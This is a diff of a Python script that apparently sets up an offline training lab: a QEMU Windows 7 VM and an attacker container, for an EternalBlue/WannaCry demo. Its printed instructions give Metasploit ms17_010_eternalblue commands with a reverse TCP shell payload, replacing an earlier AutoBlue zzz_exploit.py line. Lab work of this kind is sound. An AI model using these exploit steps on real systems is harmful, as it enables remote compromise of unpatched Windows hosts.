@@ -17,20 +17,15 @@ ATTACKER_LINK = "attacker-eth0"
 ATTACKER_PORT = "s1-attacker"
 QEMU_PIDFILE = "/run/cdci-wannacry-qemu.pid"
 LOCK_FILE = "/run/cdci-wannacry.lock"
-TAP_DHCP = "tap-dhcp"
-
 
 class LabError(RuntimeError):
     pass
 
-
 def run(*args, check=True):
     return subprocess.run(args, check=check, capture_output=True, text=True, timeout=30)
 
-
 def container(name):
     return f"mn.{name}"
-
 
 def preflight(windows_image):
     if os.geteuid() != 0:
@@ -48,7 +43,6 @@ def preflight(windows_image):
         raise LabError(f"Windows image not found: {windows_image}")
     return run(*DOCKER, "image", "inspect", "--format", "{{.Id}}", ATTACKER_IMAGE).stdout.strip()
 
-
 def require_clean_state(phase):
     containers = run(*DOCKER, "ps", "-a", "--format", "{{.Names}}").stdout.splitlines()
     bridges = run(*OVS, "list-br").stdout.splitlines()
@@ -65,11 +59,9 @@ def require_clean_state(phase):
     if problems:
         raise LabError(f"{phase}: stale lab objects ({', '.join(problems)}).")
 
-
 def setup_tap():
     run("ip", "tuntap", "add", TAP_NAME, "mode", "tap")
     run("ip", "link", "set", TAP_NAME, "up")
-
 
 def attach_tap():
     run(*OVS, "add-port", SWITCH, TAP_NAME)
@@ -78,10 +70,9 @@ def teardown_tap():
     run("ip", "link", "set", TAP_NAME, "down", check=False)
     run("ip", "tuntap", "del", TAP_NAME, "mode", "tap", check=False)
 
-
 def launch_windows(windows_image):
     cmd = [
-        "qemu-system-x86_64", "-m", "1024", "-smp", "2",
+        "qemu-system-x86_64", "-m", "1024", "-smp", "1",
         "-drive", f"file={windows_image},format=qcow2,if=ide",
         "-netdev", f"tap,id=net0,ifname={TAP_NAME},script=no,downscript=no",
         "-device", "e1000,netdev=net0",
@@ -89,17 +80,13 @@ def launch_windows(windows_image):
         "-daemonize",
         "-pidfile", QEMU_PIDFILE,
     ]
-    
-    # Check for KVM support and add acceleration flags if available
     if os.path.exists("/dev/kvm"):
         cmd.extend(["-enable-kvm", "-cpu", "host"])
         print("KVM acceleration enabled.")
     else:
         cmd.extend(["-cpu", "qemu64"])
         print("WARNING: /dev/kvm not found. Running with TCG software emulation.")
-        
     run(*cmd)
-
 
 def stop_windows():
     if not os.path.exists(QEMU_PIDFILE):
@@ -117,20 +104,21 @@ def stop_windows():
     except (OSError, ValueError):
         pass
 
-
-def wait_for_smb(victim_ip, timeout=180):
+def wait_for_smb(victim_ip, timeout=600):
     deadline = time.time() + timeout
     while time.time() < deadline:
+        # Using nc (netcat) for a fast, simple TCP check
         result = subprocess.run(
             [*DOCKER, "exec", container("attacker"),
-             "nmap", "-p", "445", "--open", "-Pn", victim_ip],
-            capture_output=True, text=True,
+             "nc", "-z", "-w", "2", victim_ip, "445"],
+            capture_output=True, text=True
         )
-        if "445/tcp open" in result.stdout:
+        if result.returncode == 0:
+            print("\nPort 445 is open!")
             return
+        print(".", end="", flush=True)
         time.sleep(2)
     raise LabError(f"Port 445 on {victim_ip} did not open within {timeout}s.")
-
 
 def run_lab(windows_image, victim_ip, hold):
     from mininet.net import Containernet
@@ -141,7 +129,6 @@ def run_lab(windows_image, victim_ip, hold):
         net = Containernet(controller=None, switch=OVSSwitch, build=False)
         cleanup.callback(require_clean_state, "Teardown")
         cleanup.callback(net.stop)
-        cleanup.callback(teardown_dhcp)
         cleanup.callback(teardown_tap)
         cleanup.callback(stop_windows)
 
@@ -152,10 +139,11 @@ def run_lab(windows_image, victim_ip, hold):
         )
         net.addLink(attacker, switch, intfName1=ATTACKER_LINK, intfName2=ATTACKER_PORT)
         net.start()
+        
+        run(*DOCKER, "exec", container("attacker"), "ip", "link", "set", ATTACKER_LINK, "up")
 
         setup_tap()
         attach_tap()
-        setup_dhcp()
         launch_windows(windows_image)
 
         print(f"Attacker: {ATTACKER_IP}/24  (container {container('attacker')})")
@@ -165,51 +153,24 @@ def run_lab(windows_image, victim_ip, hold):
 
         print("")
         print("Demo ready.")
-        print(f"  Enter attacker:  sudo docker exec -it {container('attacker')} bash")
-        print(f"  Then run:        cd /opt/AutoBlue-MS17-010")
-        print(f"                   python3 zzz_exploit.py {victim_ip}")
-        print(f"  This spawns a SYSTEM shell directly (no Metasploit module).")
+        print(f"  Enter attacker:  sudo docker exec -it {container('attacker')} msfconsole -q")
+        print(f"  Then run:")
+        print(f"    use exploit/windows/smb/ms17_010_eternalblue")
+        print(f"    set RHOSTS {victim_ip}")
+        print(f"    set PAYLOAD windows/x64/shell/reverse_tcp")
+        print(f"    set LHOST {ATTACKER_IP}")
+        print(f"    set LPORT 4444")
+        print(f"    set GroomAllocations 12")
+        print(f"    exploit")
         if hold:
             input("Press Enter to tear down: ")
 
-
-def setup_dhcp():
-    run("ip", "tuntap", "add", TAP_DHCP, "mode", "tap")
-    run("ip", "link", "set", TAP_DHCP, "up")
-    
-    run(*OVS, "add-port", SWITCH, TAP_DHCP)
-    
-    run("ip", "addr", "add", "10.0.0.1/24", "dev", TAP_DHCP)
-    
-    run("dnsmasq", 
-        "--interface=" + TAP_DHCP, 
-        "--bind-interfaces",
-        "--port=0",
-        "--dhcp-range=10.0.0.3,10.0.0.3,255.255.255.0,1h", 
-        "--pid-file=/run/cdci-dnsmasq.pid")
-
-def teardown_dhcp():
-    if os.path.exists("/run/cdci-dnsmasq.pid"):
-        try:
-            with open("/run/cdci-dnsmasq.pid") as f:
-                pid = int(f.read().strip())
-            os.kill(pid, 15)
-        except (OSError, ValueError):
-            pass
-    run("ip", "link", "set", TAP_DHCP, "down", check=False)
-    run("ip", "tuntap", "del", TAP_DHCP, "mode", "tap", check=False)
-
-
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
-    parser.add_argument("--offline", action="store_true", required=True,
-                        help="confirm this is the authorized offline VM")
-    parser.add_argument("--windows-image", required=True,
-                        help="path to the Windows 7 SP1 qcow2 image")
-    parser.add_argument("--victim-ip", default=DEFAULT_VICTIM_IP,
-                        help=f"IP configured inside the Windows VM (default {DEFAULT_VICTIM_IP})")
-    parser.add_argument("--hold", action="store_true",
-                        help="keep the lab up until Enter is pressed")
+    parser.add_argument("--offline", action="store_true", required=True)
+    parser.add_argument("--windows-image", required=True)
+    parser.add_argument("--victim-ip", default=DEFAULT_VICTIM_IP)
+    parser.add_argument("--hold", action="store_true")
     args = parser.parse_args()
 
     try:
@@ -231,7 +192,6 @@ def main():
         print("\nInterrupted; verify teardown before reconnecting the VM.", file=sys.stderr)
         return 130
     return 0
-
 
 if __name__ == "__main__":
     sys.exit(main())
